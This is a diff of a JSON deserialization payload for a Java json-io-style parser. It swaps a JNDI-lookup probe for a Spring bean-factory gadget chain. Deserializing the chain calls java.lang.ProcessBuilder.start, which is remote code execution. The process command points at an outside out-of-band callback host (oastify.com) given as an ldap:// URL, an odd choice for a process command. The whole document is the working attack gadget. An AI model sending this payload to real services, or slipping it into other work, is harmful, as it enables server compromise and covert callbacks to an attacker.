@@ -2,12 +2,282 @@
   "@type": "java.util.Arrays$ArrayList",
   "@items": [
     {
+      "@id": 3,
       "@type": "org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor",
-      "adviceBeanName": "dns://teste.com/",
       "pointcut": {
-        "@type": "org.springframework.aop.aspectj.AspectJExpressionPointcut",
-        "expression": "execution(* *.*(..))"
-      }
+        "@id": 2,
+        "@type": "org.springframework.aop.TruePointcut"
+      },
+      "adviceBeanName": "caller",
+      "beanFactory": {
+        "@type": "org.springframework.beans.factory.support.DefaultListableBeanFactory",
+        "serializationId": null,
+        "allowBeanDefinitionOverriding": true,
+        "allowEagerClassLoading": true,
+        "dependencyComparator": null,
+        "autowireCandidateResolver": {
+          "@type": "org.springframework.beans.factory.support.SimpleAutowireCandidateResolver"
+        },
+        "resolvableDependencies": {
+          "@type": "java.util.concurrent.ConcurrentHashMap"
+        },
+        "beanDefinitionMap": {
+          "@type": "java.util.concurrent.ConcurrentHashMap",
+          "caller": {
+            "@type": "org.springframework.beans.factory.support.RootBeanDefinition",
+            "decoratedDefinition": null,
+            "qualifiedElement": null,
+            "allowCaching": true,
+            "isFactoryMethodUnique": false,
+            "targetType": null,
+            "resolvedTargetType": null,
+            "factoryMethodReturnType": null,
+            "constructorArgumentLock": {},
+            "resolvedConstructorOrFactoryMethod": null,
+            "constructorArgumentsResolved": false,
+            "resolvedConstructorArguments": null,
+            "preparedConstructorArguments": null,
+            "postProcessingLock": {},
+            "postProcessed": false,
+            "beforeInstantiationResolved": null,
+            "externallyManagedConfigMembers": null,
+            "externallyManagedInitMethods": null,
+            "externallyManagedDestroyMethods": null,
+            "beanClass": null,
+            "scope": "",
+            "abstractFlag": false,
+            "lazyInit": false,
+            "autowireMode": 0,
+            "dependencyCheck": 0,
+            "dependsOn": null,
+            "autowireCandidate": true,
+            "primary": false,
+            "qualifiers": {
+              "@type": "java.util.LinkedHashMap"
+            },
+            "nonPublicAccessAllowed": true,
+            "lenientConstructorResolution": true,
+            "factoryBeanName": "obj",
+            "factoryMethodName": "start",
+            "constructorArgumentValues": {
+              "indexedArgumentValues": {
+                "@type": "java.util.LinkedHashMap"
+              },
+              "genericArgumentValues": {
+                "@type": "java.util.LinkedList"
+              }
+            },
+            "propertyValues": {
+              "propertyValueList": {
+                "@type": "java.util.ArrayList"
+              },
+              "processedProperties": null,
+              "converted": false
+            },
+            "methodOverrides": {
+              "overrides": {
+                "@type": "java.util.HashSet"
+              },
+              "modified": false
+            },
+            "initMethodName": null,
+            "destroyMethodName": null,
+            "enforceInitMethod": true,
+            "enforceDestroyMethod": true,
+            "synthetic": false,
+            "role": 0,
+            "description": null,
+            "resource": null,
+            "source": null,
+            "attributes": {
+              "@type": "java.util.LinkedHashMap"
+            }
+          }
+        },
+        "allBeanNamesByType": {
+          "@type": "java.util.concurrent.ConcurrentHashMap"
+        },
+        "singletonBeanNamesByType": {
+          "@type": "java.util.concurrent.ConcurrentHashMap"
+        },
+        "beanDefinitionNames": {
+          "@type": "java.util.ArrayList",
+          "@items": [
+            "caller"
+          ]
+        },
+        "manualSingletonNames": {
+          "@type": "java.util.LinkedHashSet"
+        },
+        "frozenBeanDefinitionNames": null,
+        "configurationFrozen": false,
+        "instantiationStrategy": {
+          "@type": "org.springframework.beans.factory.support.CglibSubclassingInstantiationStrategy"
+        },
+        "parameterNameDiscoverer": {
+          "@type": "org.springframework.core.DefaultParameterNameDiscoverer",
+          "parameterNameDiscoverers": {
+            "@type": "java.util.LinkedList",
+            "@items": [
+              {
+                "@type": "org.springframework.core.StandardReflectionParameterNameDiscoverer"
+              },
+              {
+                "@type": "org.springframework.core.LocalVariableTableParameterNameDiscoverer",
+                "parameterNamesCache": {
+                  "@type": "java.util.concurrent.ConcurrentHashMap"
+                }
+              }
+            ]
+          }
+        },
+        "allowCircularReferences": true,
+        "allowRawInjectionDespiteWrapping": false,
+        "ignoredDependencyTypes": {
+          "@type": "java.util.HashSet"
+        },
+        "ignoredDependencyInterfaces": {
+          "@type": "java.util.HashSet",
+          "@items": [
+            {
+              "@type": "class",
+              "value": "org.springframework.beans.factory.BeanClassLoaderAware"
+            },
+            {
+              "@type": "class",
+              "value": "org.springframework.beans.factory.BeanFactoryAware"
+            },
+            {
+              "@type": "class",
+              "value": "org.springframework.beans.factory.BeanNameAware"
+            }
+          ]
+        },
+        "factoryBeanInstanceCache": {
+          "@type": "java.util.concurrent.ConcurrentHashMap"
+        },
+        "filteredPropertyDescriptorsCache": {
+          "@type": "java.util.concurrent.ConcurrentHashMap"
+        },
+        "parentBeanFactory": null,
+        "beanClassLoader": null,
+        "tempClassLoader": null,
+        "cacheBeanMetadata": true,
+        "beanExpressionResolver": null,
+        "conversionService": null,
+        "propertyEditorRegistrars": {
+          "@type": "java.util.LinkedHashSet"
+        },
+        "customEditors": {
+          "@type": "java.util.HashMap"
+        },
+        "typeConverter": null,
+        "embeddedValueResolvers": {
+          "@type": "java.util.LinkedList"
+        },
+        "beanPostProcessors": {
+          "@type": "java.util.ArrayList"
+        },
+        "hasInstantiationAwareBeanPostProcessors": false,
+        "hasDestructionAwareBeanPostProcessors": false,
+        "scopes": {
+          "@type": "java.util.LinkedHashMap"
+        },
+        "securityContextProvider": null,
+        "mergedBeanDefinitions": {
+          "@type": "java.util.concurrent.ConcurrentHashMap"
+        },
+        "alreadyCreated": {
+          "@type": "java.util.HashSet"
+        },
+        "prototypesCurrentlyInCreation": {
+          "threadLocalHashCode": -1401181199
+        },
+        "factoryBeanObjectCache": {
+          "@type": "java.util.concurrent.ConcurrentHashMap"
+        },
+        "logger": {
+          "@type": "org.apache.commons.logging.impl.NoOpLog"
+        },
+        "singletonObjects": {
+          "@type": "java.util.concurrent.ConcurrentHashMap",
+          "obj": {
+            "@type": "java.lang.ProcessBuilder",
+            "command": {
+              "@type": "java.util.ArrayList",
+              "@items": [
+                "ldap://e8n0ad9g71jz34icekulunoga7gx4m.oastify.com/"
+              ]
+            },
+            "directory": null,
+            "environment": null,
+            "redirectErrorStream": false,
+            "redirects": null
+          }
+        },
+        "singletonFactories": {
+          "@type": "java.util.HashMap"
+        },
+        "earlySingletonObjects": {
+          "@type": "java.util.HashMap"
+        },
+        "registeredSingletons": {
+          "@type": "java.util.LinkedHashSet"
+        },
+        "singletonsCurrentlyInCreation": {
+          "@type": "java.util.HashSet"
+        },
+        "inCreationCheckExclusions": {
+          "@type": "java.util.HashSet"
+        },
+        "suppressedExceptions": null,
+        "singletonsCurrentlyInDestruction": false,
+        "disposableBeans": {
+          "@type": "java.util.LinkedHashMap"
+        },
+        "containedBeanMap": {
+          "@type": "java.util.concurrent.ConcurrentHashMap"
+        },
+        "dependentBeanMap": {
+          "@type": "java.util.concurrent.ConcurrentHashMap"
+        },
+        "dependenciesForBeanMap": {
+          "@type": "java.util.concurrent.ConcurrentHashMap"
+        },
+        "aliasMap": {
+          "@type": "java.util.concurrent.ConcurrentHashMap"
+        }
+      },
+      "order": null
+    },
+    {
+      "@id": 1,
+      "@type": "org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor",
+      "pointcut": {
+        "@ref": 2
+      },
+      "adviceBeanName": null,
+      "beanFactory": null,
+      "order": null
+    },
+    {
+      "@type": "java.util.HashMap",
+      "@keys": [
+        {
+          "@ref": 3
+        },
+        {
+          "@ref": 1
+        }
+      ],
+      "@items": [
+        {
+          "@ref": 3
+        },
+        {
+          "@ref": 1
+        }
+      ]
     }
   ]
 }
